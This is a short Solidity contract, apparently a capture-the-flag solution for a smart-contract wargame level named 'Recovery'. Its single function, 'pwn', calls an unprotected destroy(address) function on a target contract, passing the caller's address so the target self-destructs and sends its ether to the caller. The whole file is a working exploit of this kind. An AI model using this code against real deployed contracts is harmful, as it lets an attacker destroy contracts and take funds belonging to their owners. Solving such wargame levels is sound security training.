// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

error CallNotSuccess(bytes data);

contract Recovery {
    function pwn(address payable target) external payable {
        (bool success, bytes memory data) = target.call(
            abi.encodeWithSignature("destroy(address)", msg.sender)
        );
        if (!success) revert CallNotSuccess(data);
    }
}
